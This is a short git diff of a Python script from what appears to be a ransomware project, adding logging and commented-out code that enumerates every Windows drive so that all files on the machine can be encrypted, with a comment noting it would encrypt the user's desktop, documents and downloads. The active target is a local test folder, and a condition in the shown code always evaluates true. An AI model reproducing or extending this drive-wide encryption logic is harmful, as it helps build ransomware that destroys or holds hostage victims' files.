@@ -5,6 +5,7 @@ import os
 import pickle
 import requests
 import time
+import logging
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 from utils import *
 from utils import (
@@ -66,7 +67,20 @@ if decryptend == "y" or "Y":
 
     removeFiles = True
 
+
+    #   drives = win32api.GetLogicalDriveStrings()
+    #   drives = drives.split('\000')[:-1]
+
     paths = ["C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]
+
+    #   only append this path if you want to encrypt all files in your user directory(desktop, documents, downloads, etc.)
+    #   for drive in drives:
+    #       paths.append(drive)
+
+
+    format = "%(asctime)s: %(message)s"
+    logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
+
 
     for x in paths:
         final_session_decrypted = final_session_decrypted.decode()
